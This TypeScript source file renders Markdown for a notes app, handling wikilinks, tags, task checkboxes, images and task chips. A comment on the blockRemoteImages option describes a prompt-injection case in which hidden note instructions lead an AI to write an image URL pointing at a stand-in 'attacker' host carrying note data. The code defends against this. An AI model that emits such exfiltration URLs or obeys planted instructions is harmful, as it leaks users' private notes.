// Markdown → HTML for the reading view, chat messages and PDF export.
import MarkdownIt, { type StateCore, type StateInline } from "markdown-it";
import { TASK_RE } from "../../shared/markdown";

export interface RenderEnv {
  [key: string]: unknown;
  /** Resolves a wikilink target to a note path (or undefined if missing). */
  resolve?: (target: string) => string | undefined;
  /**
   * Show remote images as links instead of loading them. Used for AI replies: a note with hidden
   * instructions could make the AI write ![](https://attacker/?data=...) and leak note contents.
   */
  blockRemoteImages?: boolean;
  /** Path of the note being rendered, for relative image paths. */
  notePath?: string;
  /** All vault files, for ![[image.png]] embeds. */
  files?: string[];
  /** Line offset of the body inside the file (frontmatter lines). */
  lineOffset?: number;
}

const IMAGE_EXT = /\.(png|jpe?g|gif|webp|svg|avif|bmp)$/i;

export function fileUrl(rel: string): string {
  return window.vimmi.vault.fileUrl(rel);
}

function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!);
}

function wikilinkRule(state: StateInline, silent: boolean): boolean {
  const src = state.src.slice(state.pos);
  const embed = src.startsWith("![[");
  if (!embed && !src.startsWith("[[")) return false;
  const m = src.match(/^!?\[\[([^\]|#\n]+)(#[^\]|\n]*)?(?:\|([^\]\n]*))?\]\]/);
  if (!m) return false;
  if (!silent) {
    const token = state.push(embed ? "wiki_embed" : "wikilink", "", 0);
    token.meta = { target: m[1].trim(), heading: m[2]?.slice(1), alias: m[3] };
  }
  state.pos += m[0].length;
  return true;
}

function tagRule(state: StateInline, silent: boolean): boolean {
  if (state.src[state.pos] !== "#") return false;
  const prev = state.pos === 0 ? " " : state.src[state.pos - 1];
  if (!/[\s(,]/.test(prev)) return false;
  const m = state.src.slice(state.pos).match(/^#([\p{L}\p{N}_/-]*[\p{L}_][\p{L}\p{N}_/-]*)/u);
  if (!m) return false;
  if (!silent) {
    const token = state.push("vtag", "", 0);
    token.content = m[1];
  }
  state.pos += m[0].length;
  return true;
}

/** Turns "[ ] " at the start of list items into checkboxes that remember their source line. */
function taskRule(state: StateCore): void {
  const tokens = state.tokens;
  const offset = (state.env as RenderEnv).lineOffset ?? 0;
  for (let i = 2; i < tokens.length; i++) {
    const inline = tokens[i];
    if (inline.type !== "inline" || tokens[i - 1].type !== "paragraph_open" || tokens[i - 2].type !== "list_item_open") continue;
    const m = inline.content.match(/^\[([ xX])\]\s/);
    if (!m) continue;
    const first = inline.children?.[0];
    if (!first || first.type !== "text") continue;
    first.content = first.content.replace(/^\[([ xX])\]\s/, "");
    const checkbox = new state.Token("html_inline", "", 0);
    const line = (tokens[i - 2].map?.[0] ?? 0) + offset;
    const done = m[1] !== " ";
    checkbox.content = `<input type="checkbox" class="task-check" data-line="${line}"${done ? " checked" : ""}> `;
    inline.children!.unshift(checkbox);
    tokens[i - 2].attrJoin("class", done ? "task done" : "task");
  }
}

function sourceLines(state: StateCore): void {
  const offset = (state.env as RenderEnv).lineOffset ?? 0;
  for (const t of state.tokens) {
    if (t.map && t.nesting === 1 && /^(heading|paragraph|list_item|blockquote|table|fence|code_block)_open$|^fence$/.test(t.type)) {
      t.attrSet("data-line", String(t.map[0] + offset));
    }
  }
}

export const md = new MarkdownIt({ html: false, linkify: true, breaks: true, typographer: false });
md.inline.ruler.before("link", "wikilink", wikilinkRule);
md.inline.ruler.before("emphasis", "vtag", tagRule);
md.core.ruler.push("tasks", taskRule);
md.core.ruler.push("source_lines", sourceLines);

md.renderer.rules.wikilink = (tokens, idx, _opts, rawEnv) => {
  const env = (rawEnv ?? {}) as RenderEnv;
  const { target, heading, alias } = tokens[idx].meta as { target: string; heading?: string; alias?: string };
  const resolved = env.resolve?.(target);
  const label = alias || (heading ? `${target} › ${heading}` : target);
  return `<a class="wikilink${resolved ? "" : " missing"}" data-target="${escapeHtml(target)}"${
    heading ? ` data-heading="${escapeHtml(heading)}"` : ""
  } href="#">${escapeHtml(label)}</a>`;
};

md.renderer.rules.wiki_embed = (tokens, idx, _opts, rawEnv) => {
  const env = (rawEnv ?? {}) as RenderEnv;
  const { target, alias } = tokens[idx].meta as { target: string; alias?: string };
  if (IMAGE_EXT.test(target)) {
    const file = env.files?.find((f) => f === target || f.endsWith("/" + target)) ?? target;
    const width = alias && /^\d+$/.test(alias) ? ` width="${alias}"` : "";
    return `<img src="${fileUrl(file)}" alt="${escapeHtml(target)}"${width}>`;
  }
  const resolved = env.resolve?.(target);
  return `<a class="wikilink embed${resolved ? "" : " missing"}" data-target="${escapeHtml(target)}" href="#">↪ ${escapeHtml(alias || target)}</a>`;
};

md.renderer.rules.vtag = (tokens, idx) => {
  const tag = tokens[idx].content;
  return `<a class="tag" data-tag="${escapeHtml(tag.toLowerCase())}" href="#">#${escapeHtml(tag)}</a>`;
};

const defaultImage = md.renderer.rules.image!;
md.renderer.rules.image = (tokens, idx, opts, rawEnv, self) => {
  const env = (rawEnv ?? {}) as RenderEnv;
  const token = tokens[idx];
  const src = String(token.attrGet("src") ?? "");
  if (env.blockRemoteImages && /^[a-z][a-z0-9+.-]*:/i.test(src) && !src.startsWith("vimmi-file:")) {
    const label = escapeHtml(token.content || src);
    return /^https?:/i.test(src) ? `<a class="external" href="${escapeHtml(src)}">🖼 ${label}</a>` : label;
  }
  if (src && !/^[a-z][a-z0-9+.-]*:/i.test(src)) {
    let rel = decodeURI(src).replace(/^\.\//, "");
    if (env.notePath && !rel.startsWith("/")) {
      const dir = env.notePath.includes("/") ? env.notePath.slice(0, env.notePath.lastIndexOf("/")) : "";
      const candidate = dir ? `${dir}/${rel}` : rel;
      rel = env.files?.includes(candidate) ? candidate : rel;
    }
    token.attrSet("src", fileUrl(rel.replace(/^\/+/, "")));
  }
  // Obsidian-style size: ![popis|300](obrazek.png)
  const size = token.content.match(/^(.*?)\|(\d+)$/);
  if (size) {
    token.content = size[1];
    const last = token.children?.[token.children.length - 1];
    if (last?.type === "text") last.content = last.content.replace(/\|\d+$/, "");
    token.attrSet("width", size[2]);
  }
  return defaultImage(tokens, idx, opts, rawEnv, self);
};

const defaultLinkOpen = md.renderer.rules.link_open ?? ((tokens, idx, opts, _env, self) => self.renderToken(tokens, idx, opts));
md.renderer.rules.link_open = (tokens, idx, opts, env, self) => {
  const href = String(tokens[idx].attrGet("href") ?? "");
  if (/\.md(#.*)?$/i.test(href) && !/^[a-z]+:/i.test(href)) {
    tokens[idx].attrSet("class", "wikilink");
    tokens[idx].attrSet("data-target", decodeURI(href.replace(/\.md(#.*)?$/i, "")));
    tokens[idx].attrSet("href", "#");
  } else {
    tokens[idx].attrSet("class", "external");
  }
  return defaultLinkOpen(tokens, idx, opts, env, self);
};

/** Shows task metadata (@2026-10-14, !1) as small chips instead of raw markers. */
function decorateTasks(html: string): string {
  return html.replace(/(<li class="task[^"]*"[^>]*>)([\s\S]*?)(?=<\/li>|<ul|<ol)/g, (_m, open: string, body: string) => {
    const out = body
      .replace(/(^|\s)@(\d{4})-(\d{2})-(\d{2})\b/g, (_x, sp: string, y: string, mo: string, d: string) => {
        const date = `${y}-${mo}-${d}`;
        const today = new Date();
        const iso = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, "0")}-${String(today.getDate()).padStart(2, "0")}`;
        const cls = date < iso ? " overdue" : date === iso ? " today" : "";
        return `${sp}<span class="due-chip${cls}" title="${date}">${Number(d)}. ${Number(mo)}.${y === String(today.getFullYear()) ? "" : ` ${y}`}</span>`;
      })
      .replace(/(^|\s)!([123])(?=\s|<|$)/g, (_x, sp: string, p: string) => `${sp}<span class="prio p${p}" title="Priorita ${p}"></span>`)
      .replace(/✅ (\d{4}-\d{2}-\d{2})/gu, '<span class="done-chip" title="Splněno $1">✓</span>');
    return open + out;
  });
}

export function renderMarkdown(source: string, env: RenderEnv = {}): string {
  return decorateTasks(md.render(source, env as Record<PropertyKey, unknown>));
}

/** Renders a note for the reading view: strips frontmatter but keeps line numbers aligned. */
export function renderNote(content: string, env: RenderEnv = {}): { html: string; frontmatter: string | null } {
  const m = content.match(/^---\r?\n([\s\S]*?)\r?\n---[ \t]*(?:\r?\n|$)/);
  const body = m ? content.slice(m[0].length) : content;
  const lineOffset = m ? m[0].split("\n").length - 1 : 0;
  return { html: decorateTasks(md.render(body, { ...env, lineOffset })), frontmatter: m ? m[1] : null };
}

export { TASK_RE, escapeHtml };
